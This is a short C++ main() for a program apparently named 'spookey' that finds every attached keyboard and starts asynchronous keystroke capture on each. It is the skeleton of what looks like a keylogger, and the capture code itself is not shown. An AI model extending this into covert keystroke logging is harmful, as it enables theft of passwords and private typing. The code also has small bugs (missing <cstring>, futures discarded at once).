#include <future>
#include <string>
#include <vector>

#include "spookey.hh"

int main(int argc, char** argv) {
    // Parse command-line arguments
    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0) DEBUG = true;
    }

    // Find keyboards
    std::vector<Keyboard> keyboards = findKeyboards();
    int numKeyboards = keyboards.size();

    // Begin capturing keystrokes asynchronously
    for (int i = 0; i < numKeyboards; ++i) {
        auto asyncCapture =
            std::async(std::launch::async, &Keyboard::capture, &keyboards[i]);
    }

    return 0;
}
